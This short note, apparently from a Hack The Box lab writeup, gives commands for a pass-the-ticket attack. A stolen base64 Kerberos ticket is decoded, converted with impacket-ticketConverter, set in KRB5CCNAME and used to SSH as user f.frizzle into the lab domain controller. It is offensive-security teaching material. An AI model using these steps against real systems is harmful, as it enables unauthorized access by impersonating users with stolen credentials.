
If you have an .kirbi.base64 file from Post Exploitation:

```
cat ticket.kirbi.base64| base64 -d > ticket.kirbi
```

Convert the .kirbi file to an format which Linux can process (.ccache).

```
impacket-ticketConverter ticket.kirbi ticket.ccache
```

Now we can use the variable KRB5CCNAME to either map the ticket to the variable or always use the variable with the ticket e.G

```
export KRB5CCNAME=ticket.ccache
```

SSH Auth

```
KRB5CCNAME=f.frizzle.ccache ssh -K f.frizzle@frizzdc.frizz.htb
```